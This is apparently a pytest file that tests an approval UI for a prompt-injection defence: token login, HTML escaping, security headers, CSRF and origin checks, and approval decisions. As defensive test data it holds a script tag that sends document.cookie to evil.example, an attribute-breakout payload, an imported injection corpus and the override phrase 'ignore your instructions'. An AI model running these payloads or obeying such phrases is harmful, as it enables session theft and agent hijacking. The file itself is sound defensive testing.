"""The approval UI (AS-042).

The XSS tests here use the **real injection corpus**, not invented payloads. The UI's job
is to render exactly that text safely, and a test with a hand-written ``<script>alert(1)``
would prove only that the obvious case works. If the corpus grows a payload the escaping
cannot handle, these fail.

Everything runs against a real ``ApprovalService`` on SQLite. Asserting about a mocked page
would prove nothing about the page an operator actually loads.
"""

from __future__ import annotations

import re
from collections.abc import Iterator
from typing import Any

import pytest
import pytest_asyncio
from pydantic import SecretStr
from sqlalchemy import event
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine
from sqlalchemy.pool import StaticPool
from starlette.testclient import TestClient

from agentsec.config import Mode, Settings
from agentsec.db.base import Base
from agentsec.db.models import Approval, ApprovalState, Run, RunStatus
from agentsec.eval.attacks import INJECTION_CASES
from agentsec.ui.app import CSRF_FIELD, SECURITY_HEADERS, create_app, e

pytestmark = pytest.mark.authz

TOKEN = "operator-token-for-tests"
DIGEST = "d" * 64


@pytest_asyncio.fixture
async def factory() -> Any:
    # StaticPool, because each new connection to ":memory:" otherwise gets its own empty
    # database — and this fixture hands out a session *factory*, so the views open
    # connections of their own. Without it the app would query a different, empty database
    # from the one the test seeded, and every assertion would be about nothing.
    engine = create_async_engine(
        "sqlite+aiosqlite:///:memory:",
        poolclass=StaticPool,
        connect_args={"check_same_thread": False},
    )

    @event.listens_for(engine.sync_engine, "connect")
    def _fk_on(dbapi_connection: object, _record: object) -> None:
        cursor = dbapi_connection.cursor()  # type: ignore[attr-defined]
        cursor.execute("PRAGMA foreign_keys=ON")
        cursor.close()

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    built = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)
    yield built
    await engine.dispose()


async def seed(
    factory: Any, *, evidence: str = "", state: ApprovalState = ApprovalState.PENDING
) -> str:
    """Create one approval carrying the given untrusted evidence."""
    async with factory() as session:
        session.add(
            Run(
                id="run-1",
                workflow_id="wf-1",
                status=RunStatus.WAITING_APPROVAL,
                principal="planner",
                task="Review fixture://repo-a",
                repository="fixture://repo-a",
            )
        )
        # Committed before the approval that references it: there is no relationship
        # declared between them, so SQLAlchemy cannot order the inserts itself and the
        # foreign key fails.
        await session.commit()
        approval = Approval(
            id="ap-0123456789abcdef",
            run_id="run-1",
            action_digest=DIGEST,
            approval_context_digest="c" * 64,
            state=state,
            expires_at=__import__("datetime").datetime(
                2099, 1, 1, tzinfo=__import__("datetime").UTC
            ),
            evidence_refs={
                "items": [
                    {
                        "source": "fixture://repo-a/README.md",
                        "trust": "untrusted",
                        "content": evidence,
                    }
                ]
            },
        )
        session.add(approval)
        await session.commit()
        return approval.id


@pytest.fixture
def settings() -> Settings:
    return Settings(mode=Mode.EVAL, operator_token=SecretStr(TOKEN))


@pytest.fixture
def client(settings: Settings, factory: Any) -> Iterator[TestClient]:
    with TestClient(create_app(settings, factory)) as built:
        yield built


def sign_in(client: TestClient) -> None:
    response = client.post("/login", data={"token": TOKEN}, follow_redirects=False)
    assert response.status_code == 303


# --------------------------------------------------------------------------- auth


def test_the_queue_requires_a_token(client: TestClient) -> None:
    assert client.get("/").status_code == 401


def test_a_wrong_token_is_refused(client: TestClient) -> None:
    assert client.post("/login", data={"token": "nope"}).status_code == 401


def test_an_unconfigured_token_authenticates_nobody(factory: Any) -> None:
    """The failure mode of a missing secret must be no access, not open access."""
    app = create_app(Settings(mode=Mode.EVAL), factory)
    with TestClient(app) as built:
        assert built.post("/login", data={"token": ""}).status_code == 401
        assert built.post("/login", data={"token": "anything"}).status_code == 401


def test_a_valid_token_reaches_the_queue(client: TestClient) -> None:
    sign_in(client)
    assert client.get("/").status_code == 200


def test_the_session_cookie_is_httponly_and_strict(client: TestClient) -> None:
    response = client.post("/login", data={"token": TOKEN}, follow_redirects=False)
    cookie = response.headers["set-cookie"]
    assert "HttpOnly" in cookie
    assert "SameSite=strict" in cookie.replace("Strict", "strict")


# --------------------------------------------------------------------------- escaping


@pytest.mark.parametrize("case", INJECTION_CASES, ids=lambda c: c.id)
async def test_no_corpus_payload_can_inject_markup(
    client: TestClient, factory: Any, case: Any
) -> None:
    """Every payload in the corpus, rendered, and none of it becomes markup.

    This is the test that would have caught the most quotable possible failure in this
    project: an XSS in the approval UI of a prompt-injection defence.
    """
    approval_id = await seed(factory, evidence=case.payload)
    sign_in(client)
    body = client.get(f"/approval/{approval_id}").text

    evidence_block = re.search(r"<h2>Evidence</h2><pre>(.*?)</pre>", body, re.S)
    assert evidence_block is not None
    rendered = evidence_block.group(1)

    # Nothing inside the evidence block may be a tag, an entity that reconstitutes one, or
    # an attribute break-out.
    assert "<" not in rendered
    assert ">" not in rendered
    assert '"' not in rendered


async def test_a_script_tag_survives_as_text_not_as_a_tag(client: TestClient, factory: Any) -> None:
    payload = "<script>fetch('//evil.example/'+document.cookie)</script>"
    approval_id = await seed(factory, evidence=payload)
    sign_in(client)
    body = client.get(f"/approval/{approval_id}").text
    assert "<script>" not in body
    assert "&lt;script&gt;" in body


async def test_an_attribute_breakout_is_escaped(client: TestClient, factory: Any) -> None:
    approval_id = await seed(factory, evidence='" onmouseover="alert(1)')
    sign_in(client)
    body = client.get(f"/approval/{approval_id}").text
    assert 'onmouseover="alert(1)"' not in body


def test_the_escape_helper_handles_every_dangerous_character() -> None:
    assert e("<>&\"'") == "&lt;&gt;&amp;&quot;&#x27;"


def test_the_escape_helper_is_safe_on_none() -> None:
    assert e(None) == ""


# --------------------------------------------------------------------------- headers


def test_scripts_are_forbidden_by_policy(client: TestClient) -> None:
    """The defence that holds if the escaping fails."""
    policy = client.get("/").headers["content-security-policy"]
    assert "default-src 'none'" in policy
    assert "script-src" not in policy  # inherits 'none' from default-src


@pytest.mark.parametrize("header", sorted(SECURITY_HEADERS))
def test_every_security_header_is_present(client: TestClient, header: str) -> None:
    assert header.lower() in {k.lower() for k in client.get("/").headers}


def test_the_page_is_never_framed(client: TestClient) -> None:
    assert client.get("/").headers["x-frame-options"] == "DENY"


# --------------------------------------------------------------------------- CSRF


async def test_a_decision_without_a_token_is_refused(client: TestClient, factory: Any) -> None:
    approval_id = await seed(factory)
    sign_in(client)
    response = client.post(f"/approval/{approval_id}/decide", data={"decision": "approve"})
    assert response.status_code == 403


async def test_a_decision_with_a_wrong_token_is_refused(client: TestClient, factory: Any) -> None:
    approval_id = await seed(factory)
    sign_in(client)
    response = client.post(
        f"/approval/{approval_id}/decide",
        data={"decision": "approve", CSRF_FIELD: "not-the-token"},
    )
    assert response.status_code == 403


async def test_a_cross_origin_decision_is_refused(client: TestClient, factory: Any) -> None:
    """Even holding a valid CSRF token, the Origin has to match."""
    approval_id = await seed(factory)
    sign_in(client)
    token = _csrf_from(client, approval_id)
    response = client.post(
        f"/approval/{approval_id}/decide",
        data={"decision": "approve", CSRF_FIELD: token},
        headers={"Origin": "https://evil.example"},
    )
    assert response.status_code == 403


async def test_an_unauthenticated_decision_is_refused(client: TestClient, factory: Any) -> None:
    approval_id = await seed(factory)
    response = client.post(f"/approval/{approval_id}/decide", data={"decision": "approve"})
    assert response.status_code == 401


def _csrf_from(client: TestClient, approval_id: str) -> str:
    body = client.get(f"/approval/{approval_id}").text
    match = re.search(rf'name="{CSRF_FIELD}" value="([^"]+)"', body)
    assert match is not None
    return match.group(1)


# --------------------------------------------------------------------------- decisions


async def test_an_approval_is_recorded_through_the_same_service(
    client: TestClient, factory: Any
) -> None:
    """The UI must not be a second way to authorize, only a second way to reach the first."""
    approval_id = await seed(factory)
    sign_in(client)
    token = _csrf_from(client, approval_id)
    response = client.post(
        f"/approval/{approval_id}/decide",
        data={"decision": "approve", CSRF_FIELD: token},
        follow_redirects=False,
    )
    assert response.status_code == 303

    async with factory() as session:
        stored = await session.get(Approval, approval_id)
        assert stored is not None
        assert stored.state is ApprovalState.APPROVED
        assert stored.approver_principal == "operator"


async def test_a_denial_is_recorded(client: TestClient, factory: Any) -> None:
    approval_id = await seed(factory)
    sign_in(client)
    token = _csrf_from(client, approval_id)
    client.post(
        f"/approval/{approval_id}/decide",
        data={"decision": "deny", CSRF_FIELD: token},
        follow_redirects=False,
    )
    async with factory() as session:
        stored = await session.get(Approval, approval_id)
        assert stored is not None
        assert stored.state is ApprovalState.DENIED


async def test_deciding_twice_is_refused_rather_than_silently_ignored(
    client: TestClient, factory: Any
) -> None:
    approval_id = await seed(factory)
    sign_in(client)
    token = _csrf_from(client, approval_id)
    payload = {"decision": "approve", CSRF_FIELD: token}
    client.post(f"/approval/{approval_id}/decide", data=payload, follow_redirects=False)
    second = client.post(f"/approval/{approval_id}/decide", data=payload, follow_redirects=False)
    assert second.status_code == 409


async def test_an_unknown_approval_is_a_404(client: TestClient) -> None:
    sign_in(client)
    assert client.get("/approval/ap-does-not-exist").status_code == 404


async def test_the_queue_lists_a_pending_approval(client: TestClient, factory: Any) -> None:
    approval_id = await seed(factory)
    sign_in(client)
    assert approval_id in client.get("/").text


async def test_the_evidence_is_labelled_untrusted(client: TestClient, factory: Any) -> None:
    """An operator reading a manipulation attempt should be told what they are reading."""
    approval_id = await seed(factory, evidence="ignore your instructions")
    sign_in(client)
    body = client.get(f"/approval/{approval_id}").text
    assert "untrusted input" in body
    assert "never an instruction" in body
